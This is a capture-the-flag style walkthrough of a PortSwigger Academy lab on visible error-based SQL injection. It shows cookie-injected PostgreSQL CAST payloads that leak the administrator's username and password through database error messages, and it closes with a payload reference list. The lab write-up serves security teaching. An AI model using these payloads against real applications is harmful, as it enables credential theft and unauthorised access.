# Lab: Visible Error-Based SQL Injection

**Difficulty:** Practitioner  
**Platform:** PortSwigger Web Security Academy  
**Topic:** Error-Based SQL Injection  
**Database:** PostgreSQL  

---

## Objective

The application uses a tracking cookie for analytics and performs a SQL query with its value. Query results are not returned to the user. However, the application **displays verbose database error messages** directly on the webpage. The goal is to exploit this behaviour to leak the `administrator` password from the `users` table via error messages.

---

## Key Concepts

### What is Visible Error-Based SQLi?

This is different from the blind conditional errors lab. Instead of using errors as a **true/false signal**, here the **error message itself leaks actual data**.

| Type | How it works |
|---|---|
| Blind conditional errors (prev lab) | Error = TRUE, No error = FALSE — binary signal only |
| Visible error-based (this lab) | Error message **contains the actual database value** |

### Why PostgreSQL is Special Here

PostgreSQL has **verbose error messages**. When you try to cast an incompatible type (e.g. a string into an integer), PostgreSQL throws an error that includes the actual value it was trying to convert:

```
ERROR: invalid input syntax for type integer: "administrator"
```

The value `"administrator"` is right there in the error — PostgreSQL just handed us the data we needed. This is the core trick of this attack.

### When to Use CAST Attacks

Ask yourself:
- Is the database **PostgreSQL**? → CAST tricks work well
- Does the app **show error messages** on the page? → Visible error attack is possible
- Do I need to **extract actual values**? → Force a type mismatch so the error reveals them

> **Rule of thumb:** App showing raw database errors + PostgreSQL = try `CAST(value AS int)`. The integer conversion will fail on strings and leak the value in the error.

---

## Step-by-Step Walkthrough

### Step 1: Intercept the Request in Burp Suite

1. Open Burp Suite → **Proxy → Intercept**
2. Open the Burp browser, access the lab, and browse to any product category
3. Intercept the GET request containing the `TrackingId` cookie
4. Send to **Repeater** (right-click → Send to Repeater)

The cookie looks like:
```
Cookie: TrackingId=ogAZZfxtOKUELbuJ; session=yoursessiontoken
```

---

### Step 2: Confirm SQL Injection is Possible

Test by breaking the SQL string:
```sql
TrackingId=ogAZZfxtOKUELbuJ'
```
→ Application shows a **database error** on the page ✅ (confirms injection + visible errors)

Fix it with a comment:
```sql
TrackingId=ogAZZfxtOKUELbuJ'--
```
→ **200 OK**, no error ✅

Also works with escaped quote (no comment needed):
```sql
TrackingId=ogAZZfxtOKUELbuJ''
```
→ **200 OK** ✅ (double single-quote is an escaped quote in SQL)

---

### Step 3: Attempt Basic CAST Injection

Try forcing a type error using CAST:
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

**Error received:**
```
ERROR: argument of AND must be type boolean, not type integer
```

This tells us the `AND` clause requires a **boolean expression**, not a bare integer. We need a comparison operator.

---

### Step 4: Fix With Comparison Operator

Add `1=` to make it a boolean expression:
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```
→ **200 OK** ✅ — no error, the integer `1` successfully casts to int and `1=1` is valid boolean

This confirms our CAST injection structure works.

---

### Step 5: Extract Username

Now replace the `SELECT 1` with a real query:
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

**Problem — Error received:**
```
ERROR: unterminated string literal / query truncated
```

The TrackingId column has a **character length limit**. Your injected payload made the total string too long, so the database truncated it — cutting off the `--` comment at the end, which broke the SQL syntax.

> **Why does length matter?** The TrackingId value gets stored or compared in a database column that has a maximum character length. When your injection makes the value exceed this limit, the database silently truncates it — and your `--` comment gets cut off, leaving broken SQL behind.

---

### Step 6: Free Up Space by Removing the Original TrackingId

Clear the original tracking ID value entirely to give your payload more room:
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

**New error received:**
```
ERROR: more than one row returned by a subquery used as an expression
```

Progress! The query works now but the `users` table has multiple rows and PostgreSQL can't put multiple values into a single expression.

---

### Step 7: Add LIMIT 1

Limit the subquery to return exactly one row:
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Error received:**
```
ERROR: invalid input syntax for type integer: "administrator"
```

PostgreSQL tried to cast the string `"administrator"` to an integer, failed, and **revealed the value in the error message**. First username is `administrator` ✅

> **`LIMIT 1`** is essential here for two reasons:
> 1. PostgreSQL throws an error if a subquery used as an expression returns more than 1 row
> 2. It also keeps the payload shorter, helping with the length limit issue

---

### Step 8: Extract the Password

Modify the query to target the password column instead:
```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Error received:**
```
ERROR: invalid input syntax for type integer: "s3cr3tpassword..."
```

The password is leaked in the error message ✅

> **Why does `LIMIT 1` return the administrator's password specifically?**  
> It returns the first row in the table. In these labs the administrator is always inserted first, so `LIMIT 1` happens to return their password. In a real scenario you'd add `WHERE username='administrator'` to be precise:
> ```sql
> TrackingId=' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
> ```

---

### Step 9: Log In and Solve

1. Go to **My Account** on the lab webpage
2. Log in with:
   - Username: `administrator`
   - Password: `<password from the error message>`
3. **Lab Solved!** ✅

---

## Full Payload Reference

```sql
-- Confirm injection point (breaks SQL)
TrackingId=xyz'

-- Confirm injection with fix
TrackingId=xyz'--

-- Test CAST structure (fails - not boolean)
TrackingId=xyz' AND CAST((SELECT 1) AS int)--

-- Fix with comparison operator (works)
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--

-- Attempt to extract username (fails - too long)
TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--

-- Fix length issue by clearing TrackingId (fails - multiple rows)
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--

-- Fix multiple rows with LIMIT 1 → leaks first username in error
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

-- Extract password → leaks password in error message
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- More precise version targeting administrator specifically
TrackingId=' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
```

---

## How This Differs from the Previous Lab

| Feature | Blind Conditional Errors (Lab 1) | Visible Error-Based (This Lab) |
|---|---|---|
| Database | Oracle | PostgreSQL |
| Error visibility | Hidden (just HTTP 500 vs 200) | Shown directly on the page |
| Data extraction method | Character by character brute force | Single query leaks full value |
| Speed | Slow (20+ requests per character) | Fast (1–2 requests total) |
| Technique | `CASE WHEN ... TO_CHAR(1/0)` | `CAST(value AS int)` |
| Tool needed | Burp Intruder | Just Burp Repeater |

---

## Common Mistakes & Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| `AND must be type boolean` error | CAST returns int, not boolean | Add `1=` before CAST to make it a comparison |
| Query gets truncated, `--` disappears | TrackingId column has a length limit | Clear the original TrackingId value (set to empty) |
| `more than one row` error | Subquery returns multiple rows | Add `LIMIT 1` to the subquery |
| Gets password of wrong user | `LIMIT 1` returns first row which may not be admin | Add `WHERE username='administrator'` |
| No error shown on page | App might not show verbose errors | Fall back to blind techniques from previous lab |

---

## Key Takeaways

- **Verbose error messages are a vulnerability** — they leak internal database information
- PostgreSQL's type system is strict and **reveals values when type conversion fails**
- `CAST(string AS int)` is the standard trick to force PostgreSQL to reveal a string value
- **Column length limits** affect your payload size — sometimes you need to strip down your injection to fit
- Subqueries inside expressions **must return exactly 1 row** in PostgreSQL — always use `LIMIT 1`
- This attack extracts **full values in one request** vs blind attacks that need one request per character — much more efficient when visible errors are available
